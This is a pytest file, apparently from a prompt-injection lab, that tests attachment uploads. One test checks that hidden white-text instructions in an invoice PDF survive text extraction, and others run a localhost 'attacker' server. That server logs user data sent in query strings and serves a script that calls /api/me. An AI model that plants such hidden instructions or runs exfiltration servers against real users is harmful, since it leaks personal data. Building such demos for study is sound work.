import threading
import urllib.request
from collections.abc import Iterator
from pathlib import Path

import pytest
from conftest import login
from fastapi.testclient import TestClient
from sqlalchemy.engine import Engine
from sqlalchemy.orm import Session

import attachments
from attacker import server as attacker
from scenarios.attacks import S2_HIDDEN, S2_INVOICE_FILE, S2_PAYLOAD

DOCS = Path(__file__).resolve().parents[1] / "scenarios" / "docs"


@pytest.fixture(autouse=True)
def tmp_uploads(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    upload_dir = tmp_path / "uploads"
    monkeypatch.setattr(attachments, "UPLOAD_DIR", upload_dir)
    return upload_dir


# ---- 첨부 업로드 (spec 3.5) ----


def test_upload_requires_login(client: TestClient) -> None:
    res = client.post("/api/attachments", files={"file": ("a.txt", b"hello", "text/plain")})
    assert res.status_code == 401


def test_upload_txt_and_pdf(client: TestClient, tmp_uploads: Path) -> None:
    login(client)
    res = client.post("/api/attachments", files={"file": ("메모.txt", "안녕하세요".encode(), "text/plain")})
    assert res.status_code == 200
    assert res.json()["filename"] == "메모.txt"
    pdf = (DOCS / S2_INVOICE_FILE).read_bytes()
    res = client.post("/api/attachments", files={"file": ("invoice.pdf", pdf, "application/pdf")})
    assert res.status_code == 200 and res.json()["content_type"] == "application/pdf"
    assert len(list(tmp_uploads.iterdir())) == 2  # 파일과 DB 기록이 둘 다 생긴다


@pytest.mark.parametrize(
    ("name", "data"),
    [
        ("big.txt", b"a" * (1024 * 1024 + 1)),  # 1MB 초과
        ("run.exe", b"MZ..."),  # 지원하지 않는 형식
        ("fake.pdf", b"not a pdf"),  # 확장자만 PDF
        ("empty.txt", b""),
    ],
)
def test_upload_rejected(client: TestClient, tmp_uploads: Path, name: str, data: bytes) -> None:
    login(client)
    res = client.post("/api/attachments", files={"file": (name, data, "application/octet-stream")})
    assert res.status_code == 400
    assert res.json()["detail"] == attachments.UNSUPPORTED
    assert not tmp_uploads.exists() or not any(tmp_uploads.iterdir())


def test_only_owner_can_use_attachment(seeded: Engine) -> None:
    with Session(seeded) as s:
        a = attachments.save_attachment(s, "C-1001", "memo.txt", "내 메모".encode())
        assert attachments.load_attachment_text(s, "C-1001", a.id)[1] == "내 메모"
        with pytest.raises(attachments.AttachmentError, match="찾을 수 없습니다"):
            attachments.load_attachment_text(s, "C-1002", a.id)


def test_invoice_hidden_text_is_extracted() -> None:
    """흰 글씨로 숨긴 지시도 글자 추출에는 그대로 나온다 (실제 사례의 공격 경로)."""
    text = " ".join(attachments.extract_text((DOCS / S2_INVOICE_FILE).read_bytes(), ".pdf").split())
    assert "333-0000-1111" in text and "120,000원" in text
    assert " ".join(S2_HIDDEN.split()) in text
    assert S2_PAYLOAD in text


def test_only_one_invoice_pdf() -> None:
    """변형 PDF는 두지 않는다 (spec 5장: 실제 사례 원문만)."""
    assert sorted(p.name for p in DOCS.glob("*.pdf")) == [S2_INVOICE_FILE]


# ---- 공격자 서버 ----


@pytest.fixture
def attacker_url(tmp_path: Path) -> Iterator[tuple[str, Path]]:
    log_file = tmp_path / "attacker_log.jsonl"
    srv = attacker.make_server(port=0, log_file=log_file)
    thread = threading.Thread(target=srv.serve_forever, daemon=True)
    thread.start()
    yield f"http://127.0.0.1:{srv.server_address[1]}", log_file
    srv.shutdown()
    srv.server_close()


def test_attacker_server_logs_requests(attacker_url: tuple[str, Path]) -> None:
    url, log_file = attacker_url
    with urllib.request.urlopen(f"{url}/c?d=%7B%22email%22%3A%22minsu%40example.com%22%7D") as res:
        assert res.status == 204
    entries = attacker.read_log(log_file)
    assert entries[-1]["path"] == "/c"
    assert entries[-1]["query"] == {"d": '{"email":"minsu@example.com"}'}


def test_attacker_serves_script_with_cors(attacker_url: tuple[str, Path]) -> None:
    url, _ = attacker_url
    with urllib.request.urlopen(f"{url}/x") as res:
        body = res.read().decode()
        assert res.headers["Access-Control-Allow-Origin"] == "*"
        assert res.headers["Content-Type"].startswith("text/javascript")
    assert "/api/me" in body and "127.0.0.1" in body


def test_attacker_binds_localhost_only() -> None:
    srv = attacker.make_server(port=0, log_file=Path("unused.jsonl"))
    try:
        assert srv.server_address[0] == "127.0.0.1"
    finally:
        srv.server_close()
